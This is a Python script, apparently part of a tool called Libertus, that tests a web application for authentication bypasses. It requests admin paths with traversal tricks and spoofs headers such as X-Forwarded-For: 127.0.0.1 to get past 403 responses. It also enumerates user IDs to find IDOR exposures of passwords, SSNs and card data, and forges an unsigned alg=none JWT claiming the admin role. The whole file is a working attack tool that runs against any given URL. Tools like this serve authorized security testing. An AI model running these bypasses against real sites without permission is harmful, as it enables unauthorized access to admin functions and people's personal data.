#!/usr/bin/env python3
"""
LIBERTUS AUTH BYPASS TESTER

Testa bypass de autenticação e autorização:
1. Broken Authentication
2. Broken Access Control (IDOR)
3. JWT manipulation
4. Session fixation
5. Path traversal em auth
"""

import asyncio
import aiohttp
from typing import List, Dict
import json
import base64


class LibertusAuthBypass:
    """Tester de bypass de autenticação"""
    
    def __init__(self):
        # Auth bypass payloads
        self.auth_paths = [
            '/admin',
            '/admin/',
            '//admin',
            '/admin..;/',
            '/%2e%2e/admin',
            '/api/admin',
            '/v1/admin',
            '/admin/dashboard',
            '/admin/users',
            '/dashboard',
            '/panel',
            '/cp',
            '/manage',
        ]
        
        # IDOR test paths
        self.idor_patterns = [
            '/user/{id}',
            '/profile/{id}',
            '/account/{id}',
            '/api/user/{id}',
            '/api/users/{id}',
        ]
    
    async def test(self, base_url: str) -> List[Dict]:
        """Testa bypass de auth"""
        
        vulnerabilities = []
        
        print(f"🔍 Testing Auth Bypass: {base_url}")
        print("="*60)
        
        # 1. Direct admin access
        print("\n🚪 Testing direct admin access...")
        vulns = await self._test_admin_access(base_url)
        vulnerabilities.extend(vulns)
        
        # 2. IDOR
        print("\n🔢 Testing IDOR...")
        vulns = await self._test_idor(base_url)
        vulnerabilities.extend(vulns)
        
        # 3. JWT manipulation
        print("\n🎫 Testing JWT...")
        vulns = await self._test_jwt(base_url)
        vulnerabilities.extend(vulns)
        
        print(f"\n✅ Auth bypass vulns found: {len(vulnerabilities)}")
        
        return vulnerabilities
    
    async def _test_admin_access(self, base_url: str) -> List[Dict]:
        """Testa acesso direto a admin"""
        
        vulnerabilities = []
        
        async with aiohttp.ClientSession() as session:
            for path in self.auth_paths:
                url = base_url.rstrip('/') + path
                
                try:
                    # Testa sem auth
                    async with session.get(url, timeout=5, allow_redirects=False) as resp:
                        status = resp.status
                        
                        # 200 = acesso direto (CRÍTICO)
                        # 403 = existe mas bloqueado (informação)
                        # 401 = requer auth (esperado)
                        # 404 = não existe
                        
                        if status == 200:
                            content = await resp.text()
                            
                            # Verifica se realmente é admin
                            admin_indicators = [
                                'dashboard',
                                'admin panel',
                                'users',
                                'manage',
                                'control panel',
                            ]
                            
                            content_lower = content.lower()
                            for indicator in admin_indicators:
                                if indicator in content_lower:
                                    vulnerabilities.append({
                                        'type': 'broken_access_control',
                                        'path': path,
                                        'url': url,
                                        'evidence': f'Admin panel accessible without auth',
                                        'severity': 'CRITICAL'
                                    })
                                    
                                    print(f"   💥 ADMIN ACCESS: {path}")
                                    break
                        
                        elif status == 403:
                            # Existe mas bloqueado - try bypass
                            bypass_vuln = await self._try_403_bypass(session, url)
                            if bypass_vuln:
                                vulnerabilities.append(bypass_vuln)
                
                except:
                    continue
        
        return vulnerabilities
    
    async def _try_403_bypass(self, session, url: str) -> Dict:
        """Tenta bypass de 403"""
        
        # Técnicas de bypass
        bypass_techniques = [
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
            ('X-Forwarded-For', '127.0.0.1'),
            ('X-Forwarded-Host', 'localhost'),
            ('X-Host', 'localhost'),
        ]
        
        for header_name, header_value in bypass_techniques:
            try:
                headers = {header_name: header_value}
                
                async with session.get(url, headers=headers, timeout=5) as resp:
                    if resp.status == 200:
                        return {
                            'type': 'auth_bypass_403',
                            'url': url,
                            'evidence': f'403 bypassed via {header_name}: {header_value}',
                            'severity': 'CRITICAL'
                        }
            except:
                continue
        
        return None
    
    async def _test_idor(self, base_url: str) -> List[Dict]:
        """Testa IDOR (Insecure Direct Object Reference)"""
        
        vulnerabilities = []
        
        async with aiohttp.ClientSession() as session:
            for pattern in self.idor_patterns:
                # Testa IDs 1-10
                for user_id in [1, 2, 3, 100, 1000]:
                    path = pattern.replace('{id}', str(user_id))
                    url = base_url.rstrip('/') + path
                    
                    try:
                        async with session.get(url, timeout=5) as resp:
                            if resp.status == 200:
                                content = await resp.text()
                                
                                # Procura dados sensíveis
                                sensitive_indicators = [
                                    'email',
                                    'password',
                                    'ssn',
                                    'credit_card',
                                    'phone',
                                    'address',
                                ]
                                
                                content_lower = content.lower()
                                for indicator in sensitive_indicators:
                                    if indicator in content_lower:
                                        vulnerabilities.append({
                                            'type': 'idor',
                                            'path': path,
                                            'url': url,
                                            'evidence': f'User data accessible via IDOR (ID={user_id})',
                                            'severity': 'HIGH'
                                        })
                                        
                                        print(f"   💥 IDOR: {path} (ID={user_id})")
                                        break
                    
                    except:
                        continue
        
        return vulnerabilities
    
    async def _test_jwt(self, base_url: str) -> List[Dict]:
        """Testa manipulação de JWT"""
        
        vulnerabilities = []
        
        # JWT comum (exemplo)
        # eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoidXNlciJ9.signature
        
        # Cria JWT manipulado
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).decode().rstrip('=')
        
        payload = base64.urlsafe_b64encode(
            json.dumps({"user_id": 1, "role": "admin"}).encode()
        ).decode().rstrip('=')
        
        # JWT sem assinatura
        jwt_none = f"{header}.{payload}."
        
        async with aiohttp.ClientSession() as session:
            # Testa em endpoints comuns
            test_paths = ['/api/user', '/profile', '/dashboard']
            
            for path in test_paths:
                url = base_url.rstrip('/') + path
                
                try:
                    headers = {
                        'Authorization': f'Bearer {jwt_none}'
                    }
                    
                    async with session.get(url, headers=headers, timeout=5) as resp:
                        if resp.status == 200:
                            vulnerabilities.append({
                                'type': 'jwt_none_algorithm',
                                'path': path,
                                'url': url,
                                'evidence': 'JWT with alg=none accepted',
                                'severity': 'CRITICAL'
                            })
                            
                            print(f"   💥 JWT NONE ALGORITHM: {path}")
                
                except:
                    continue
        
        return vulnerabilities


async def main():
    """Teste"""
    tester = LibertusAuthBypass()
    
    vulns = await tester.test("https://example.com")
    
    print("\n" + "="*60)
    print(f"✅ Auth bypass vulns found: {len(vulns)}")
    
    for vuln in vulns:
        print(f"\n🎯 {vuln['type'].upper()}")
        print(f"   Path: {vuln.get('path', 'N/A')}")
        print(f"   Evidence: {vuln['evidence']}")


if __name__ == "__main__":
    asyncio.run(main())
